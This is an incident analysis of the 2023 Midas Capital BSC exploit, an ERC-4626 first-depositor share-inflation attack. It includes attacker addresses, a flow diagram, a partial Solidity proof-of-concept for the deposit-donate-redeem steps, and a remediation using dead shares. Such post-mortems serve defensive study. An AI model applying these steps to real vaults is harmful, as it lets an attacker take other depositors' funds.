# Midas Capital XYZ — BSC ERC-4626 Inflation Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2023-06-23 |
| **Protocol** | Midas Capital (BSC) |
| **Chain** | BSC |
| **Loss** | ~600K USD |
| **Attacker** | [0x4b92cc34...](https://bscscan.com/address/0x4b92cc3452ef1e37528470495b86d3f976470734) |
| **Attack Contract** | [0xc40119c7...](https://bscscan.com/address/0xc40119c7269a5fa813d878bf83d14e3462fc8fde) |
| **Attack Tx** | [0x4a304ff0...](https://app.blocksec.com/explorer/tx/bsc/0x4a304ff08851106691f626045b0f55d403e3a0958363bdf82b96e8ce7209c3a6) |
| **Vulnerable Contract** | [0xf8527dc5...](https://bscscan.com/address/0xf8527dc5611b589cbb365acacaac0d1dc70b25cb) |
| **Root Cause** | ERC-4626 first depositor share price inflation in the HAY-BUSD LP vault |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-06/MidasCapitalXYZ_exp.sol) |

---
## 1. Vulnerability Overview

The HAY-BUSDT vault deployed on BSC by Midas Capital is ERC-4626-based and vulnerable to a first depositor attack. The attacker deposits a minimal amount to acquire shares, then directly transfers assets to the vault to massively inflate the share price. Subsequent depositors receive nearly zero shares due to rounding errors, and their assets are effectively absorbed by the attacker. This is a recurrence of the same pattern seen in the April Midas Capital attack.

## 2. Vulnerable Code Analysis

```solidity
// ❌ HAY-BUSDT Vault: first depositor vulnerability
interface IHAY_BUSDT_Vault {
    function deposit(uint256 amount, address to) external returns (uint256);
    // ❌ totalAssets = balanceOf(address(this)) → manipulable via direct transfer
}

function convertToShares(uint256 assets) public view returns (uint256) {
    uint256 supply = totalSupply();
    if (supply == 0) return assets;
    // ❌ If attacker artificially inflates totalAssets,
    // victim shares = assets * supply / totalAssets → 0 (rounded down)
    return assets * supply / totalAssets();
}
```

### On-Chain Source Code

Source: Bytecode decompilation

```solidity
// Root cause: ERC-4626 first depositor share price inflation in the HAY-BUSD LP vault
// Source code unverified — analysis based on bytecode
```

## 3. Attack Flow

```
┌──────────────────────────────────────────────────────┐
│  1. Borrow HAY tokens via flash loan                  │
└──────────────────────────────┬───────────────────────┘
                               ▼
┌──────────────────────────────────────────────────────┐
│  2. Deposit 1 wei into HAY-BUSDT vault → receive 1 share │
└──────────────────────────────┬───────────────────────┘
                               ▼
┌──────────────────────────────────────────────────────┐
│  3. Directly transfer (donate) large amount of HAY   │
│     to vault → 1 share = millions of HAY             │
└──────────────────────────────┬───────────────────────┘
                               ▼
┌──────────────────────────────────────────────────────┐
│  4. Victim deposit(large amount) → shares = 0 (rounded down) │
│     → victim assets absorbed into vault              │
└──────────────────────────────┬───────────────────────┘
                               ▼
┌──────────────────────────────────────────────────────┐
│  5. Attacker redeems 1 share → drains all assets     │
│  6. Repay flash loan + 600K USD profit               │
└──────────────────────────────────────────────────────┘
```

## 4. PoC Code

```solidity
function testExploit() public {
    // 1. Borrow HAY via flash loan

    // 2. Deposit 1 wei → 1 share
    hay.approve(address(vault), 1);
    vault.deposit(1, address(this));

    // 3. Inflate share price by directly transferring large amount of HAY
    hay.transfer(address(vault), donateAmount);

    // 4. Victims deposit → shares = 0 → assets stolen
    // (in the actual attack, either wait for other users to deposit,
    //  or self-deposit multiple times to induce rounding losses)

    // 5. Redeem 1 share to recover all assets
    vault.redeem(vault.balanceOf(address(this)), address(this), address(this));

    // 6. Repay flash loan
}
```

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern |
|----|--------|--------|-----|-----------|
| V-01 | ERC-4626 first depositor inflation | CRITICAL | CWE-682 | 05_integer_issues.md |
| V-02 | totalAssets manipulation via direct transfer | HIGH | CWE-664 | 16_accounting_sync.md |

## 6. Remediation Recommendations

### Immediate Action
```solidity
// ✅ Use OpenZeppelin 4.9+ ERC4626 (_decimalsOffset)
// ✅ Or deposit initial dead shares at construction
constructor() {
    // Deposit minimum liquidity at deployment to prevent first depositor attack
    _mint(address(0xdead), 1000);
    asset.transferFrom(deployer, address(this), 1000);
}
```

## 7. Lessons Learned

Following the April Midas Capital attack (Ethereum, Compound fork), the identical ERC-4626 first depositor vulnerability recurred in the June BSC deployment. When the same team operates multi-chain deployments, discovering a vulnerability on one chain must trigger simultaneous patching across all chains immediately.